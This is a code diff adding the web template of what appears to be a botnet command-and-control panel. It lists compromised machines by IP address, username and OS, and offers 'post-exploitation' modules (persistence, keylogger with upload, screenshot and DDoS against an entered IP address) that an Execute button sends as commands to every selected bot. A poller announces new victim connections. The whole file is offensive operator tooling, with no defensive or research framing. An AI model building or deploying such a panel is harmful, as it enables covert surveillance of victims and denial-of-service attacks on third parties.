@@ -1,0 +1,235 @@
+{% extends "layout.html" %}
+{% set active_page = 'sessions' %}
+
+{% block body %}
+    <div class="tw-flex tw-justify-center tw-items-start tw-py-4">
+        <div class="tw-min-h-54 tw-w-80 tw-flex tw-flex-col tw-bg-card tw-rounded-xl tw-py-4">
+            <div class="tw-text-center">
+                <header class="tw-text-xl tw-font-bold tw-text-text tw-pb-4">Post-Exploitation Modules</header>
+            </div>
+            <div class="tw-text-center">
+                <select class="tw-overflow-visible tw-w-36 tw-h-5 tw-text-center" id="module">
+                    <option disabled selected value>-- Select module --</option>
+                    <option value="persistence">Persistence</option>
+                    <option value="keylogger">Keylogger</option>
+                    <option value="screenshot">Screenshot</option>
+                    <option value="ddos">DDOS</option>
+                </select>
+            </div>
+            <div class="tw-text-text tw-px-4 tw-pt-2 tw-text-left" id="keylogger">
+                <div class="tw-p-1">
+                    <input  type="radio" id="keylogger-run" name="radio-keylogger" checked>
+                    <label class="tw-select-none" for="keylogger-run">Run</label>
+                </div>
+                <div class="tw-p-1">
+                    <input type="radio" id="keylogger-stop" name="radio-keylogger">
+                    <label class="tw-select-none" for="keylogger-stop">Stop</label>
+                </div>
+                <div class="tw-p-1">
+                    <input type="radio" id="keylogger-upload" name="radio-keylogger">
+                    <label class="tw-select-none" for="keylogger-upload">Upload</label>
+                </div>
+            </div>
+            <div class="tw-text-text tw-text-left tw-px-4 tw-pt-2" id="ddos">
+                <div class="tw-p-1">
+                    <label class="tw-select-none" for="ddos-run">Address</label>
+                    <input type="text" id="ddos-address">
+                </div>
+                <div class="tw-p-1">
+                    <input type="radio" id="ddos-run" name="radio-ddos" checked>
+                    <label class="tw-select-none" for="ddos-run">Run</label>
+                </div>
+                <div class="tw-p-1">
+                    <input type="radio" id="ddos-stop" name="radio-ddos">
+                    <label class="tw-select-none" for="ddos-stop">Stop</label>
+                </div>
+            </div>
+			<div class="tw-flex tw-justify-center tw-pt-4 tw-px-12">
+					<button class="tw-text-background tw-bg-primary tw-border-0 tw-rounded tw-p-2 hover:tw-bg-text tw-cursor-pointer" onclick="executeBulkAction()">Execute</button>
+			</div>
+        </div>
+    </div>
+		
+    <div class="tw-flex-1 tw-flex tw-flex-col tw-justify-center tw-items-center tw-p-4">
+        <div class="tw-flex-1 tw-flex tw-flex-col tw-w-3/4 tw-bg-card tw-items-center tw-rounded-xl tw-p-4">
+            <div>
+                <header class="tw-text-xl tw-font-bold tw-text-text tw-pb-4">Sessions</header>
+            </div>
+            <div class="tw-h-80 tw-w-11/12 tw-bg-text tw-rounded tw-overflow-y-auto tw-m-5">
+                <table class="tw-table-fixed tw-w-full tw-p-0 tw-border-spacing-0">
+                    <thead class="tw-sticky tw-top-0 tw-bg-darker-text">
+                        <tr class="tw-h-10">
+                            <th class="tw-text-background tw-text-center">
+                                <input type="checkbox" id="check-all">
+                                <label class="tw-px-2" for="check-all">Select all</label>
+                            </th>
+                            <th class="tw-text-background tw-text-center">IP Address</th>
+                            <th class="tw-text-background tw-text-center">Username</th>
+                            <th class="tw-text-background tw-text-center">OS</th>
+                            <th class="tw-text-background tw-text-center">Status</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for session in sessions %}
+                            <tr class="tw-h-8">
+                                <td class="tw-text-background tw-text-center tw-pt-2">
+                                    <input type="checkbox" id="chk-{{ session.uid }}" name="{{ session.uid }}" class="tw-m-2">
+                                </td>
+                                <td class="tw-text-background tw-text-center tw-pt-2">{{ session.public_ip }}</td>
+                                <td class="tw-text-background tw-text-center tw-pt-2">{{ session.username }}</td>
+                                <td class="tw-text-background tw-text-center tw-pt-2">{{ session.platform }}</td>
+                                <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}">
+                                    {% if session.online %}
+                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="green" class="tw-w-6 tw-h-6">
+                                            <path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z" />
+                                        </svg>
+                                    {% else %}
+                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="red" class="tw-w-6 tw-h-6">
+                                            <path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z" />
+                                        </svg>
+                                    {% endif %}
+                                </td>
+                            </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+		function executeBulkAction() {
+			// get module to execute
+			var action = $('#module').val();
+			var params = '';
+
+            if (action === 'keylogger') {
+				if ($('#' + action + '-run').is(':checked')) {
+					params += 'run';
+				} else if ($('#' + action + '-stop').is(':checked')) {
+					params += 'stop';
+				} else if ($('#' + action + '-upload').is(':checked')) {
+					params += 'upload';
+				}
+			} else if (action === 'ddos'){
+                if ($('#' + action + '-run').is(':checked')) {
+					params += 'run';
+                    if ($('#ddos-address').val() === '') {
+                        toastr.error('Please enter an address to attack');
+                        return;
+                    }
+                    let pattern = /^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/;
+                    if (!pattern.test($('#ddos-address').val())) {
+                        toastr.error('Please enter a valid IP address');
+                        return;
+                    }
+                    params += ' ' + $('#ddos-address').val();
+				} else if ($('#' + action + '-stop').is(':checked')) {
+					params += 'stop';
+				}
+            }
+            else { 
+                toastr.info('Please select a module to execute');
+                return;
+            }
+			var command = action + ' ' + params;
+
+			var sessions = $('[id^="chk"]:checked');
+
+			// iterate through selected sessions
+			for (var i = 0; i < sessions.length; i++) {
+				var session = sessions[i];
+					var uid = session.getAttribute('id').split('-')[1];
+
+					console.log("Sending command: '" + command + "' to session '" + uid + "'");
+
+					$.ajax({
+						url: "{{ url_for('session.session_cmd') }}", 
+						type: "POST",
+						data: {session_uid: uid, cmd: command}, 
+						ajaxI: i,
+						success: function(response) {
+                			i = this.ajaxI;
+							toastr.success("Bot " + i + ": " + response);
+                            if (response == "offline") {
+                                $('#status-' + uid).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="red" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
+                            }
+			            }
+			        });
+			}
+		}
+	</script>
+
+    <script>
+        $(document).ready(function(){
+            $('#ddos').hide();
+            $('#keylogger').hide();
+        });
+
+        $(document).ready(function () {
+            $("#module").change(function () {
+                var selectedValue = $(this).val();
+                
+                if (selectedValue === "keylogger") {
+                    $("#keylogger").show();
+                } else {
+                    $("#keylogger").hide();
+                }
+
+                if (selectedValue === "ddos") {
+                    $("#ddos").show();
+                } else {
+                    $("#ddos").hide();
+                }
+            });
+            
+            $("#check-all").change(function () {
+                var isChecked = $(this).is(":checked");
+                if (isChecked) {
+                    $("[id^=chk]").prop("checked", true);
+                } else {
+                    $("[id^=chk]").prop("checked", false);
+                }
+            });
+
+            $("[id^=chk]").change(function () {
+                var allChecked = $("[id^=chk]:checked").length === $("[id^=chk]").length;
+                if (allChecked) {
+                    $("#check-all").prop("checked", true);
+                } else {
+                    $("#check-all").prop("checked", false);
+                }
+            });
+        });
+
+    </script>
+
+    <script>
+
+        const sleep = (milliseconds) => {
+            return new Promise(resolve => setTimeout(resolve, milliseconds))
+        }
+
+        const pollServer = async () => {
+            while (true) {
+                await sleep(1000);
+                $.getJSON('/api/session/poll', function(data) {
+                    try {
+                        if (data.length > 0) {
+
+                            for (var i = 0; i < data.length; i++) {
+                                let session = data[i];
+                                var notification = toastr.success('New connection from ' + session.public_ip);
+                                $(notification).click(function () { location.href='/sessions'; });
+                            }
+                        }
+                    } catch (e) {
+                        console.error(e);
+                    }
+                });
+            }
+        }
+
+        pollServer();
+    </script>
+{% endblock %}
